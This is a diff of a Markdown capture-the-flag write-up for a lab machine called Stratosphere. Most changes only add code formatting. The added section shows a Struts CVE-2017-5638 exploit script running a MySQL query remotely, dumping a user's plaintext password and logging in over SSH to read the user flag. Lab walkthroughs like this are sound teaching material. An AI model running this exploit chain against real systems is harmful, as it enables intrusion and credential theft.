@@ -158,7 +158,7 @@ We have two open ports:
 
 <br />
 
-We proceed to list the website and it seems that it is still being developed since there are not many things:
+We proceed to list the `website` and it seems that it is still `being developed` since there are not many things:
 
 <br />
 
@@ -166,7 +166,7 @@ We proceed to list the website and it seems that it is still being developed sin
 
 <br />
 
-Continue exploring the website and we see a path that confirms our theory:
+Continue exploring the `website` and we see a `path` that confirms our theory:
 
 <br />
 
@@ -174,7 +174,7 @@ Continue exploring the website and we see a path that confirms our theory:
 
 <br />
 
-We started to further list the website using wfuzz to discover interesting paths and listed the following:
+We started to further list the website using `wfuzz` to discover `interesting paths` and listed the following:
 
 <br />
 
@@ -222,7 +222,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <br />
 
-Try to log into the web or create an account but its not posible because the website seems to be under construction:
+Try to `log` into the web or `create an account` but its not posible because the website seems to be `under construction`:
 
 <br />
 
@@ -242,7 +242,7 @@ After that, we make a search about the path `(welcome.action)` to know what tech
 
 <br />
 
-This web server suffered from a rather critical vulnerability back in the day `(CVE-2017-5638)`, so we proceeded to search and found a [repository](https://github.com/mazen160/struts-pwn) with the following script in Python to exploit it:
+This web server suffered from a rather `critical vulnerability` back in the day `(CVE-2017-5638)`, so we proceeded to search and found a [repository](https://github.com/mazen160/struts-pwn) with the following script in `Python` to exploit it:
 
 <br />
 
@@ -446,7 +446,7 @@ if __name__ == '__main__':
 
 <br />
 
-The first thing is to verify that the script applies to our case, so we execute an id:
+The first thing is to `verify` that the `script` applies to our case, so we execute an `id`:
 
 <br />
 
@@ -467,11 +467,11 @@ uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
 
 <br />
 
-Perfect!! We are executing commands as the user tomcat8.
+Perfect!! We are `executing commands` as the user `tomcat8`.
 
 <br />
 
-After verify that we are able to execute commands, try to gain access to the system with a reverse shell but in this case it was unsuccessful, so we start enumerating the system with a ls -l of the actual directory:
+After verify that we are able to execute commands, try to gain access to the system with a `reverse shell` but in this case it was `unsuccessful`, so we start enumerating the system with a `ls -l` of the actual directory:
 
 <br />
 
@@ -499,7 +499,7 @@ lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
 
 <br />
 
-Look at that! There is a file named db_connect, it seems interesting, let's take a look:
+Look at that! There is a file named `db_connect`, it seems interesting, let's take a look:
 
 <br />
 
@@ -526,7 +526,7 @@ pass=admin
 
 <br />
 
-Perfect! We have database credentials, so we can try to enumerate the Mysql database.
+Perfect! We have `database credentials`, so we can try to enumerate the `MySql` database.
 
 As we can see, there are two databases:
 
@@ -554,7 +554,7 @@ Note: Server Connection Closed Prematurely
 
 <br />
 
-We are going to list first the users database. It have only one table, accounts:
+We are going to list first the `users database`. It have only one table, `accounts`:
 
 <br />
 
@@ -580,7 +580,7 @@ Database: users
 
 <br />
 
-We list its structure and it looks good:
+We list its `structure` and it looks good:
 
 <br />
 
@@ -608,4 +608,55 @@ Database: users  Table: accounts
 
 <br />
 
+Okey!!! We have new `user and password`:
 
+<br />
+
+```bash
+❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysql -u admin -padmin -D users -e "select username, password from accounts"'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
+[*] CMD: mysql -u admin -padmin -D users -e "select username, password from accounts"
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
+username	password
+richard	9tc*rhKuG5TyXvUJOrE^5CK7k
+
+[%] Done.
+```
+
+<br />
+
+Let's try to connect with ssh as `richard`:
+
+<br />
+
+```bash
+❯ ssh richard@10.10.10.64
+richard@10.10.10.64's password: 
+Linux stratosphere 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Dec  3 12:20:42 2023 from 10.10.10.2
+richard@stratosphere:~$ export TERM=xterm
+richard@stratosphere:~$ stty rows 45 columns 184
+richard@stratosphere:~$ cd
+richard@stratosphere:~$ cat user.txt
+104d5fae9a4f20d62bc6a7b771xxxxxx
+```
+
+<br />
+
+Intrusion and user.txt ready!! Come on with the Privilege Escalation!!
+
+# Privilege Escalation: richard -> root
+
+<br />
